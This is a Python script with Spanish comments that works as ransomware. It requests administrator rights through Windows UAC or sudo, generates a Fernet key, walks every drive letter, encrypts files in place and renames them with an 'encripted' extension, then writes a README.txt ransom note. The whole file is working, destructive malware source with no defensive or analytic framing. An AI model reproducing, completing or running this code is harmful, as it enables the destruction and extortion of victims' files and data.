from cryptography.fernet import Fernet
import os
import psutil
import sys
import ctypes
import os
import sys
import platform
import ctypes



def run_as_admin():
    try:
        system_name = platform.system()
        
        if system_name == "Windows":
            # Verifica si ya tiene permisos de administrador en Windows
            if ctypes.windll.shell32.IsUserAnAdmin():
                print("El script ya tiene permisos de administrador en Windows.")
                return False
            
            # Solicita permisos de administrador
            print("Solicitando permisos de administrador en Windows...")
            args = " ".join(sys.argv)
            return ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, args, None, 1) == 42

        elif system_name == "Linux":
            # Verifica si ya tiene permisos de administrador en Linux
            if os.geteuid() == 0:
                print("El script ya tiene permisos de administrador en Linux.")
                return True
            
            # Solicita permisos de administrador
            print("Solicitando permisos de administrador en Linux...")
            command = ["sudo", sys.executable] + sys.argv
            os.execvp("sudo", command)
            return True
        else:
            print(f"El sistema operativo '{system_name}' no está soportado.")
            return False

    except Exception as e:
        print(f"Error al solicitar permisos de administrador: {e}")
        return False



extension = 'encripted'


# Función para generar la clave de cifrado y almacenada en un archivo en el directorio local.
def generar_key():
    key = Fernet.generate_key()
    print(key)
    with open('key.key', 'wb') as key_file:
        key_file.write(key)


# Función para obtener la clave de cifrado del archivo local.
def cargar_key():
    return open('key.key', 'rb').read()


# Función para encriptar los archivos y su renombramiento con la extensión personalizada.
def encrypt(item, key):
    f = Fernet(key)
    with open(item, 'rb') as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(item, 'wb') as file:
        file.write(encrypted_data)
    os.rename(item, item + '.' + extension)

def find_drives():
    L = set()
    for i in range(ord('a'), ord('z')+1):
        drive = chr(i)
        if(os.path.exists(drive +":\\")):
            L.add(drive.upper()+":\\")
    return L


def listar_files_in_dirs(rute):
    for root, dirs, files in os.walk(rute):
        for directorio in dirs:
            # Cambiar a lista en lugar de set
            yield tuple(os.path.join(root, fileName) for fileName in files)



if __name__ == '__main__':

    if run_as_admin():
        print("Permisos de administrador concedidos.")
        sys.exit()
    try:

        # Generación la clave de cifrado y se almacena en una variable.
        generar_key()
        key = cargar_key()
        
        for drive in find_drives():
            for paths in listar_files_in_dirs(drive):
                for path in paths:
                    try:
                        print(f'Intentando cifrar {path}')
                        encrypt(path, key)

                    except Exception as e:
                        print('Error:', e)
                # Mensaje para pedir el rescate guardado en el equipo atacado, normalmente en el escritorio.
            with open( path + '\\README.txt', 'w') as file:
                file.write('Ficheros encriptados.\nSe suele pedir un rescate para el desencriptado.')

    except Exception as e:
        print(e)